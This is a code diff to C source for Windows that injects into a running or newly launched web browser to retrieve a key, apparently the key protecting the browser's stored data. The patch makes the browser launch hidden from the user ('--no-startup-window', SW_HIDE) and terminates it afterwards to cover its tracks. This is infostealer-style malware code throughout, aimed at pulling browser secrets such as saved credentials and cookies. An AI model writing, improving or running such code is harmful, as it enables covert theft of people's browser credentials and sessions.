@@ -2,7 +2,7 @@
 
 static ULONG
 AbeFindProcessIdByName(
-    _In_z_ PCWSTR Name)
+    _In_ PCWSTR Name)
 {
     UNICODE_STRING Target;
     PSYSTEM_PROCESS_INFORMATION Entry;
@@ -35,7 +35,7 @@ AbeFindProcessIdByName(
 
 /*** method: Inject (target the running browser process, launch it if needed) ***/
 
-_Success_(return)
+_Success_(return != FALSE)
 BOOL
 AbeGetKeyInject(
     _In_ const NET_BROWSER_INFO* Browser,
@@ -44,9 +44,10 @@ AbeGetKeyInject(
     PVOID Self = (PVOID)&__ImageBase;
     PVOID Mapped = NULL;
     HANDLE Process = NULL, Thread = NULL;
+    HANDLE LaunchedProcess = NULL;
     SIZE_T RegionSize = 0;
     LONG Code = (LONG)E_FAIL;
-    ULONG Pid, Polls;
+    ULONG Pid, Polls, LaunchedPid = 0;
     NTSTATUS Status;
 
     if (!AbePrepareRequest(Browser))
@@ -60,23 +61,31 @@ AbeGetKeyInject(
         /* not running: launch it so we have a live process to inject into */
         PROCESS_INFORMATION Pi;
 
-        if (!AbeCreateBrowserProcess(Browser->ExePath, 0, &Pi))
+        if (!AbeCreateBrowserProcessEx(Browser->ExePath,
+                                       L"--no-startup-window",
+                                       0,
+                                       SW_HIDE,
+                                       &Pi))
         {
             AbeLog(L"Inject: failed to create browser process, gle=%lu\r\n", Err_GetLastError());
             return FALSE;
         }
+        LaunchedProcess = Pi.hProcess;
+        LaunchedPid = Pi.dwProcessId;
+        Pid = LaunchedPid;
         NtClose(Pi.hThread);
-        NtClose(Pi.hProcess);
         for (Polls = 0; Polls < 50; Polls++)
         {
-            Pid = AbeFindProcessIdByName(Browser->ExeName);
-            if (Pid != 0)
+            ULONG FoundPid = AbeFindProcessIdByName(Browser->ExeName);
+
+            if (FoundPid != 0)
             {
+                Pid = FoundPid;
                 break;
             }
             PS_DelayExec(200);
         }
-        AbeLog(L"Inject: launched %ls (pid=%lu)\r\n", Browser->ExeName, Pid);
+        AbeLog(L"Inject: launched hidden %ls (pid=%lu)\r\n", Browser->ExeName, Pid);
     }
     if (Pid == 0)
     {
@@ -91,6 +100,12 @@ AbeGetKeyInject(
     if (!NT_SUCCESS(Status))
     {
         AbeLog(L"Inject: OpenProcess(%lu) failed, 0x%08lX\r\n", Pid, Status);
+        if (LaunchedProcess != NULL)
+        {
+            NtTerminateProcess(LaunchedProcess, 0);
+            NtWaitForSingleObject(LaunchedProcess, FALSE, NULL);
+            NtClose(LaunchedProcess);
+        }
         return FALSE;
     }
 
@@ -119,6 +134,23 @@ AbeGetKeyInject(
     {
         NtFreeVirtualMemory(Process, &Mapped, &RegionSize, MEM_RELEASE);
     }
-    NtClose(Process);
+    if (LaunchedProcess != NULL)
+    {
+        if (Process != NULL)
+        {
+            NtTerminateProcess(Process, 0);
+            NtWaitForSingleObject(Process, FALSE, NULL);
+        }
+        if (LaunchedPid != 0 && LaunchedPid != Pid)
+        {
+            NtTerminateProcess(LaunchedProcess, 0);
+            NtWaitForSingleObject(LaunchedProcess, FALSE, NULL);
+        }
+        NtClose(LaunchedProcess);
+    }
+    if (Process != NULL)
+    {
+        NtClose(Process);
+    }
     return Code == 0;
 }
